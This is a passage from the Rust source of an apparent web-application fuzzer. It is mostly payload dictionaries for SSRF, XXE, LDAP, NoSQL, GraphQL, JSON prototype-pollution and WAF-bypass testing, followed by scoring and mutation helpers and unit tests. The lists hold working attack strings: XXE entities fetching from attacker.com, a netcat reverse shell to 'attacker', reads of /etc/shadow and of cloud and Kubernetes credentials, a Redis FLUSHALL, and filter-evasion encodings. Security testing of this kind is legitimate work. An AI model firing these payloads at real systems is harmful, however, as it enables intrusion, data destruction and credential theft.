            "http://127.0.0.1:8500/v1/agent/self",
            "http://127.0.0.1:9200/_cat/indices",
            "http://127.0.0.1:8200/v1/auth/token/lookup-self",
            "gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%20y%0d%0aQUIT%0d%0a",
            "file:///etc/shadow",
            "file:///root/.aws/credentials",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
            "http://[::ffff:7f00:1]/",
            "http://0x7f000001.nip.io/",
            "http://localtest.me/",
            "http://lvh.me/",
            "http://127.0.0.1.nip.io/",
            "http://0/",
            "http://127.1:80/",
            "http://127.0.0.1:6379/",
            "http://127.0.0.1:3306/",
            "http://127.0.0.1:27017/",
            "http://127.0.0.1:10250/pods",
            "http://127.0.0.1:2379/version",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn parameter_wordlist() -> Vec<String> {
        let raw = [
            "id",
            "user",
            "username",
            "password",
            "email",
            "token",
            "key",
            "api_key",
            "secret",
            "q",
            "search",
            "query",
            "s",
            "file",
            "path",
            "url",
            "redirect",
            "next",
            "callback",
            "debug",
            "test",
            "admin",
            "role",
            "group",
            "permission",
            "action",
            "cmd",
            "exec",
            "page",
            "offset",
            "limit",
            "order",
            "sort",
            "filter",
            "where",
            "select",
            "include",
            "name",
            "title",
            "body",
            "content",
            "message",
            "subject",
            "description",
            "comment",
            "amount",
            "price",
            "quantity",
            "total",
            "currency",
            "card",
            "cvv",
            "expiry",
            "host",
            "ip",
            "port",
            "domain",
            "target",
            "source",
            "dest",
            "origin",
            "referer",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn path_wordlist() -> Vec<String> {
        let raw = [
            "/admin",
            "/admin/login",
            "/administrator",
            "/wp-admin",
            "/api",
            "/api/v1",
            "/api/v2",
            "/swagger.json",
            "/openapi.json",
            "/v1/api",
            "/graphql",
            "/api/graphql",
            "/console",
            "/.env",
            "/config.json",
            "/.git/config",
            "/.git/HEAD",
            "/robots.txt",
            "/sitemap.xml",
            "/actuator",
            "/actuator/health",
            "/actuator/env",
            "/actuator/heapdump",
            "/jolokia",
            "/metrics",
            "/prometheus",
            "/health",
            "/_all_dbs",
            "/.aws/credentials",
            "/_config",
            "/debug",
            "/test",
            "/dev",
            "/staging",
            "/backup",
            "/bak",
            "/old",
            "/.well-known/security.txt",
            "/login",
            "/register",
            "/reset-password",
            "/forgot",
            "/auth",
            "/oauth",
            "/token",
            "/uploads",
            "/files",
            "/static",
            "/assets",
            "/media",
            "/public",
            "/private",
            "/.htaccess",
            "/.htpasswd",
            "/server-status",
            "/server-info",
            "/phpinfo.php",
            "/info.php",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn header_wordlist() -> Vec<String> {
        let raw = [
            "X-Forwarded-For",
            "X-Forwarded-Host",
            "X-Forwarded-Proto",
            "X-Real-IP",
            "X-Original-URL",
            "X-Override-URL",
            "X-Remote-IP",
            "X-Remote-Addr",
            "X-Client-IP",
            "X-Host",
            "X-HTTP-Host-Override",
            "X-Forwarded-Server",
            "X-Forwarded-Scheme",
            "X-Scheme",
            "X-Original-Method",
            "X-Method-Override",
            "X-HTTP-Method",
            "X-HTTP-Method-Override",
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Referer",
            "User-Agent",
            "Cookie",
            "Authorization",
            "X-Api-Key",
            "X-CSRF-Token",
            "X-XSRF-Token",
            "X-Request-ID",
            "X-Forwarded-Host:evil.com",
            "X-Host:evil.com",
            "X-Forwarded-Proto:https",
            "X-Original-URL:/admin",
            "X-Rewrite-URL:/admin",
            "X-Custom-IP-Authorization:127.0.0.1",
            "X-Real-IP:127.0.0.1",
            "X-Client-IP:127.0.0.1",
            "X-Originating-IP:127.0.0.1",
            "X-Remote-IP:127.0.0.1",
            "Forwarded:for=127.0.0.1;host=evil.com",
            "Forwarded:for=127.0.0.1",
            "X-Forwarded-For:127.0.0.1",
            "X-Forwarded-For:10.0.0.1",
            "True-Client-IP:127.0.0.1",
            "CF-Connecting-IP:127.0.0.1",
            "X-Real-IP:10.0.0.1",
            "X-Forwarded-Host:admin.example.com",
            "X-Forwarded-Server:internal",
            "X-Forwarded-Server:evil.com",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn xxe_wordlist() -> Vec<String> {
        let raw = [
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><x>&xxe;</x>",
            "<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///C:/windows/win.ini\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % d SYSTEM \"http://attacker.com/d.dtd\">%d;]><x/>",
            "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></foo>",
            "<!DOCTYPE x [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"expect://id\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/instance/\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ELEMENT x ANY><!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><x>&xxe;</x>",
            "<svg xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></svg>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///C:/windows/win.ini\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"http://127.0.0.1:9200/\">]><x>&xxe;</x>",
            "<root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" href=\"file:///etc/passwd\"/></root>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/nginx/nginx.conf\">]><x>&xxe;</x>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"data://text/plain,GRYM\">]><x>&xxe;</x>",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn ldap_wordlist() -> Vec<String> {
        let raw = [
            "*",
            "*)(uid=*",
            "*)(uid=*))(&(uid=*",
            "admin*)(&(password=*",
            "*)(&(password=*)",
            "*)(uid=*))(&(uid=*",
            "*))((objectClass=*",
            "*)(objectClass=*)(&",
            "*;",
            "|uid=*",
            "(&(uid=*)(uid=*))",
            "(&(uid=*)(password=*))",
            "*)(uid=*))(&(uid=*",
            "*)(&(objectClass=top)",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
            "*)(uid=*))(&(uid=*",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn nosqli_wordlist() -> Vec<String> {
        let raw = [
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$regex\": \".*\"}",
            "{\"$exists\": true}",
            "{\"$where\": \"this.password.length > 0\"}",
            "{\"$or\": [{}, {}]}",
            "[\"$ne\"]=null",
            "[$ne]=null",
            "[$gt]=",
            "[$regex]=.*",
            "[$exists]=true",
            "[$where]=1",
            "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
            "{\"$nin\":[\"\",null]}",
            "{\"$size\":0}",
            "{\"$type\":2}",
            "username[$ne]=admin&password[$ne]=",
            "username[$regex]=^a&password[$regex]=.*",
            "[$ne]=1",
            "[$ne]=x",
            "[$lt]=",
            "[$lte]=",
            "[$gte]=",
            "[$in][]=1",
            "[$all][]=x",
            "[$mod]=[1,0]",
            "[$where]=1==1",
            "[$where]=sleep(3000)",
            "[$regex]=^$",
            "[$regex]=^GRYM",
            "[$size]=1",
            "[$type]=string",
            "[$elemMatch][$gt]=",
            "[$not][$eq]=x",
            "{\"$where\":\"sleep(5000)\"}",
            "{\"$mod\":[1,0]}",
            "{\"$regex\":\"^.*$\"}",
            "{\"$ne\":\"x\",\"$gt\":\"\"}",
            "[$exists]=false",
            "[$nin][]=null",
            "%5B%24ne%5D=1",
            "$ne=1",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn graphql_wordlist() -> Vec<String> {
        let raw = [
            "{__schema{types{name,fields{name}}}}",
            "{__type(name:\"User\"){fields{name,type{name}}}}",
            "query{__schema{queryType{name}}}",
            "{user(id:1){id,name,password}}",
            "{users{email,password,role}}",
            "mutation{login(username:\"admin\",password:\"admin\"){token}}",
            "{__schema{directives{name,description,locations,args{name}}}}",
            "{node(id:\"1\"){... on User{id email}}}",
            "query{__schema{mutationType{name}}}",
            "{introspection:__schema{types{name,fields{name,args{name}}}}}",
            "{__schema{queryType{fields{name,args{name,type{name}}}}}}",
            "{__type(name:\"Query\"){fields{name}}}",
            "{__type(name:\"Mutation\"){fields{name}}}",
            "{__type(name:\"Subscription\"){fields{name}}}",
            "{__schema{types{name,kind,interfaces{name}}}}",
            "query{__typename}",
            "{__schema{queryType{name,fields{name}}}}",
            "{__schema{types{name,fields{name,type{kind,name,ofType{name}}}}}}",
            "{__schema{subscriptionType{name}}}",
            "mutation{__typename}",
            "subscription{__typename}",
            "{user(id:1){__typename}}",
            "{search(q:\"*\"){__typename}}",
            "{__schema{types{name,fields{args{name,defaultValue}}}}}",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn json_injection_wordlist() -> Vec<String> {
        let raw = [
            "{\"role\":\"admin\"}",
            "{\"role\":\"admin\", \"isAdmin\":true}",
            "{\"admin\":true}",
            "{\"role\":\"admin\", \"verified\":true}",
            "{\"user\":null, \"role\":\"admin\"}",
            "{\"$eq\":\"admin\"}",
            "{\"__proto__\":{\"isAdmin\":true}}",
            "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
            "{\"isAdmin\":true}",
            "{\"role\":[\"user\",\"admin\"]}",
            "{\"role\":{\"$in\":[\"admin\"]}}",
            "{\"\":{\"$eq\":\"admin\"}}",
            "{\"$or\":[{\"role\":\"admin\"}]}",
            "{\"attributes\":{\"role\":\"admin\"}}",
            "{\"user\":{\"role\":\"admin\"}}",
            "{\"__proto__\":{\"admin\":true}}",
            "{\"constructor\":{\"prototype\":{\"admin\":true}}}",
            "{\"isAdmin\":\"true\"}",
            "{\"admin\":\"true\"}",
            "{\"permissions\":[\"*\"]}",
            "{\"role\":{\"$gt\":\"\"}}",
            "{\"role\":\"ADMIN\"}",
            "{\"role\":\"admin\",\"debug\":true}",
            "{\"role\":\"admin\"]}",
            "{\"role\":\"admin\",\"role\":\"user\"}",
            "{\"admin\":true, \"__proto__\":{\"admin\":true}}",
            "{\"id\":\"1\",\"role\":\"admin\"}",
            "{\"\":\"admin\"}",
            "{\"$where\":\"1\"}",
            "{\"role\":\"admin\"}}",
            "{\"type\":\"admin\"}",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn waf_bypass_wordlist() -> Vec<String> {
        let raw = [
            "<scrIpt>alert(1)</scrIpt>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<img src=x ONERROR=alert(1)>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert&#40;1&#41;</script>",
            "<img src=x onerror=alert&#40;1&#41;>",
            "\"><img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            "<script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            "<img src=x onerror=top[8680439..toString(30)](1)>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "SELECT/**/1/**/FROM/**/users",
            "UNI%6Fn/**/SELECT",
            "1' AND 1=1--",
            "1%27%20AND%201%3D1--",
            "1%bf%27%20or%201%3d1--",
            "1%df%27%20or%201%3d1--",
            "1/**/AND/**/1=1",
            "1/**/OR/**/1=1",
            "../",
            "..%2f",
            "..%252f",
            "%2e%2e%2f",
            "%c0%af",
            "%c1%9c",
            "....//",
            "..%00/",
            "{\"$ne\":null}",
            "[$ne]=null",
            "{\"$where\":\"sleep(5000)\"}",
            "; id",
            "| whoami",
            "`id`",
            "$(id)",
            "; sleep 5",
            "; nc -e /bin/sh attacker 4444",
            "<sCrIpT>alert(1)</sCrIpT>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "</script><script>alert(1)</script>",
            "<img src=x onerror=alert(1)//>",
            "<img/src=x/onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<svg onanimationend=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<details%0aopen%0aontoggle=alert(1)>",
            "<body onpageshow=alert(1)>",
            "<input autofocus onfocusin=alert(1)>",
            "<math><mtext><script>alert(1)</script></mtext></math>",
            "<math><mtext/onload=alert(1)//<p>",
            "<video><source onerror=alert(1)>",
            "<audio><source onerror=alert(1)>",
            "<object data=x onerror=alert(1)>",
            "<embed src=x onerror=alert(1)>",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "<iframe src=x onload=alert(1)>",
            "<button autofocus onfocus=alert(1)>",
            "<p onclick=alert(1)>x</p>",
            "<p onauxclick=alert(1)>x</p>",
            "<style>@import '//evil.com/xss.css';</style>",
            "<div style=width:expression(alert(1))>",
            "<a href=jav&#x61;script:alert(1)>x</a>",
            "jav&#x61;script:alert(1)",
            "javascript&#58;alert(1)",
            "java%0ascript:alert(1)",
            "java%09script:alert(1)",
            "java%0d%0ascript:alert(1)",
            "javascript:alert%281%29",
            "<img src=x onerror=&#x61;lert(1)>",
            "<img src=x onerror=&#97;lert(1)>",
            "<svg onload=&#x61;lert(1)>",
            "<script>\\u0061lert(1)</script>",
            "<img src=x onerror=\\u0061lert(1)>",
            "<script>window['al'+'ert'](1)</script>",
            "<script>top['alert'](1)</script>",
            "<script>eval.call(window,'alert(1)')</script>",
            "<script>[].constructor.constructor('alert(1)')()</script>",
            "{{constructor.constructor('alert(1)')()}}",
            "<ng-app>{{7*7}}</ng-app>",
            "1'/**/OR/**/1=1--",
            "1'/**/AND/**/SLEEP(5)--",
            "1';WAITFOR/**/DELAY/**/'0:0:5'--",
            "UNION/**/SELECT/**/1,2,3--",
            "uni%6fn sel%65ct 1,2,3--",
            "uNioN/**/SelEcT/**/1--",
            "1'||(SELECT/**/1)--",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%c0%af..%c0%afetc%2fpasswd",
            "..%u2215..%u2215etc%u2215passwd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
            "[$where]=sleep(3000)",
            "[$regex]=^.*$",
            "{\"$where\":\"sleep(3000)\"}",
            "%3B%20id",
            "%26%26%20id",
            ";echo%20GRYM;",
            "|echo%20GRYM|",
            ";{cat,/etc/passwd}",
            "$({whoami})",
            "${IFS}whoami",
            "%00;id",
            ";i$@d",
            ";whoami%00",
            "'-WAITFOR DELAY '0:0:5'--",
            "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
            "' AND 1=2 UNION SELECT 1,2,3--",
            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
            "<scr%00ipt>alert(1)</scr%00ipt>",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }
}

/// Calculate anomaly score comparing response to baseline.
pub fn calculate_anomaly_score(
    baseline_status: u16,
    baseline_time_ms: u128,
    result_status: u16,
    _result_length: usize,
    result_time_ms: u128,
) -> f64 {
    let mut score: f64 = 0.0;
    if result_status != baseline_status {
        score += 0.3;
    }
    if result_status >= 500 {
        score += 0.3;
    }
    if result_time_ms > baseline_time_ms.saturating_mul(3) && result_time_ms > 1000 {
        score += 0.4;
    }
    score.min(1.0)
}

/// Adaptive mutation based on previous results.
pub fn adaptive_mutation(base_payload: &str, previous_results: &[FuzzResult]) -> Vec<String> {
    let mut variants = vec![
        urlencoding::encode(base_payload).to_string(),
        base_payload.replace(' ', "%20"),
        base_payload.replace('<', "&lt;").replace('>', "&gt;"),
        base_payload.to_uppercase(),
        base_payload.to_lowercase(),
        format!("{}%00", base_payload),
        format!("%00{}", base_payload),
        format!("'{}'", base_payload),
        format!("\"{}\"", base_payload),
        base_payload.replace("=", "%3d").replace("&", "%26"),
        base_payload.replace("/", "%2f"),
    ];

    if previous_results.iter().any(|r| r.status == 403) {
        variants.push(base_payload.replace('<', "<\\x00"));
        variants.push(base_payload.replace('"', "\\x22"));
    }

    variants
}

fn create_fuzz_finding(
    title: &str,
    category: &str,
    payload: &str,
    score: f64,
    status: u16,
    length: usize,
    time: u128,
) -> Finding {
    let mut f = Finding::new(
        format!("Fuzz: {}", title),
        grym_core::AssetRef {
            identifier: "fuzz-target".into(),
            kind: "parameter".into(),
        },
        if score > 0.8 {
            Severity::High
        } else if score > 0.5 {
            Severity::Medium
        } else {
            Severity::Low
        },
        grym_core::Confidence::Possible,
        "grym-fuzzer",
    );
    f.categories.push(category.into());
    f.remediation = format!(
        "Payload generated anomaly score {:.2} with status {} ({} bytes, {} ms)",
        score, status, length, time
    );
    f.evidence.push(grym_core::Evidence::redacted(
        "fuzz-payload",
        title,
        &format!(
            "Payload: {} | Score: {:.2}",
            payload.chars().take(120).collect::<String>(),
            score
        ),
    ));
    f
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_calculate_anomaly_score_status_diff() {
        let score = calculate_anomaly_score(200, 100, 500, 1000, 100);
        assert!(score > 0.0);
    }

    #[test]
    fn test_calculate_anomaly_score_time_anomaly() {
        let score = calculate_anomaly_score(200, 100, 200, 1000, 5000);
        assert!(score > 0.0);
    }

    #[test]
    fn test_calculate_anomaly_score_no_anomaly() {
        let score = calculate_anomaly_score(200, 100, 200, 1000, 100);
        assert_eq!(score, 0.0);
    }

    #[test]
    fn test_adaptive_mutation_generates_variants() {
        let variants = adaptive_mutation("<script>", &[]);
        assert!(!variants.is_empty());
        assert!(
            variants.iter().any(|v| v.contains("%3c"))
                || variants.iter().any(|v| v.contains("%3C"))
        );
    }

    #[test]
    fn test_path_traversal_wordlist_not_empty() {
        assert!(!dictionaries::path_traversal_wordlist().is_empty());
    }

    #[test]
    fn test_sqli_wordlist_contains_time_based() {
        let list = dictionaries::sqli_wordlist();
        assert!(list.iter().any(|p| p.contains("SLEEP")));
    }

    #[test]
    fn test_xss_wordlist_contains_script() {
        let list = dictionaries::xss_wordlist();
        assert!(list.iter().any(|p| p.contains("<script>")));
    }

    #[test]
    fn test_xxe_wordlist_contains_doctype() {
        let list = dictionaries::xxe_wordlist();
        assert!(list.iter().any(|p| p.contains("<!DOCTYPE")));
    }

    #[test]
    fn test_nosqli_wordlist_contains_dollar_operators() {
        let list = dictionaries::nosqli_wordlist();
        assert!(list.iter().any(|p| p.contains("$ne")));
        assert!(list.iter().any(|p| p.contains("$where")));
    }

    #[test]
    fn test_graphql_wordlist_contains_introspection() {
        let list = dictionaries::graphql_wordlist();
        assert!(list.iter().any(|p| p.contains("__schema")));
    }

    #[test]
    fn test_waf_bypass_wordlist_non_empty() {
        assert!(!dictionaries::waf_bypass_wordlist().is_empty());
    }

    #[test]
    fn test_json_injection_wordlist_contains_proto() {
        let list = dictionaries::json_injection_wordlist();
        assert!(list.iter().any(|p| p.contains("isAdmin\":true")));
    }

    #[test]
    fn test_ldap_wordlist_contains_wildcards() {
        let list = dictionaries::ldap_wordlist();
        assert!(list.iter().any(|p| p.starts_with('*')));
    }
}
